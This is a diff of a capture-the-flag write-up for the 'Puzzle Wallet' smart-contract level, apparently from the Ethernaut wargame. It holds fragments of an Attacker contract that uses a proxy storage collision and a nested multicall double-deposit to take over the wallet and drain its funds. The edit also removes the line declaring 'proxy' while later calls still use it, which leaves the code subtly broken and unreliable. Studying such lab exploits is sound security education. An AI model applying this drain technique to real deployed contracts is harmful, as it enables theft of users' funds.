@@ -1,7 +1,7 @@
 ---
 title: "Puzzle Wallet"
 date: "2024-02-25T10:44:00.000Z"
-lastmod: "2024-03-07T09:32:00.000Z"
+lastmod: "2024-03-07T09:43:00.000Z"
 draft: false
 difficulty: "⭐⭐⭐⭐"
 prev: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
@@ -14,7 +14,7 @@ NOTION_METADATA:
   object: "page"
   id: "45b8e0a7-c478-4a4b-9526-72eecda0daa6"
   created_time: "2024-02-25T10:44:00.000Z"
-  last_edited_time: "2024-03-07T09:32:00.000Z"
+  last_edited_time: "2024-03-07T09:43:00.000Z"
   created_by:
     object: "user"
     id: "7866207c-089f-43df-9333-1dc33859c6a9"
@@ -117,7 +117,7 @@ NOTION_METADATA:
           href: null
   url: "https://www.notion.so/Puzzle-Wallet-45b8e0a7c4784a4b952672eecda0daa6"
   public_url: null
-UPDATE_TIME: "2024-03-07T09:33:21.340Z"
+UPDATE_TIME: "2024-03-07T09:44:07.518Z"
 
 ---
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
@@ -267,16 +267,7 @@ interface PuzzleProxy {
 }
 
 contract Attacker {
-  mapping(address => bool) public whitelisted;
-
-  constructor() {
-    whitelisted[msg.sender] = true;
-    whitelisted[address(this)] = true;
-  }
-
   function attack(PuzzleProxy _proxy) public payable {
-    PuzzleProxy proxy = _proxy;
-
     // [slot0] PuzzleWallet: owner => PuzzleProxy: pendingAdmin
     // This mean that owner is now the address of the attacker
     proxy.proposeNewAdmin(address(this));
@@ -284,7 +275,7 @@ contract Attacker {
 
     bytes memory deposit = abi.encodeCall(PuzzleProxy.deposit, ());
 
-    // We can call multicall inside multicall to by pass the depositCalled flag
+    // We can call multicall inside multicall to bypass the depositCalled flag
     // It's like some sort of re-entrancy variant attack
     bytes[] memory datas = new bytes[](1);
     datas[0] = deposit;
@@ -294,7 +285,7 @@ contract Attacker {
     selectors[1] = multicall; // One deposit call nested iside a multicall
     selectors[0] = deposit; // The second deposit call
 
-    // So we deposit once but we can our balance increased twice !
+    // So we deposit once but we can increase our balance twice !
     proxy.multicall{ value: msg.value }(selectors);
 
     // Then we can withdraw all funds to our address
@@ -342,17 +333,14 @@ contract POC is Script {
 ```
 
 
-> Next time, those friends will request an audit before depositing any money on a contract. Congrats!  
-> Frequently, using proxy contracts is highly recommended to bring   
-> upgradeability features and reduce the deployment's gas cost. However,   
-> developers must be careful not to introduce storage collisions, as seen   
-> in this level.  
->   
-> Furthermore, iterating over operations that consume ETH can lead to   
-> issues if it is not handled correctly. Even if ETH is spent, `msg.value`  
->  will remain the same, so the developer must manually keep track of the   
-> actual remaining amount on each iteration. This can also lead to issues   
-> when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.  
->   
-> Move on to the next level when you're ready!
+Next time, those friends will request an audit before depositing any money on a contract. Congrats!
+
+
+Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.
+
+
+Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.
+
+
+Move on to the next level when you're ready!
 
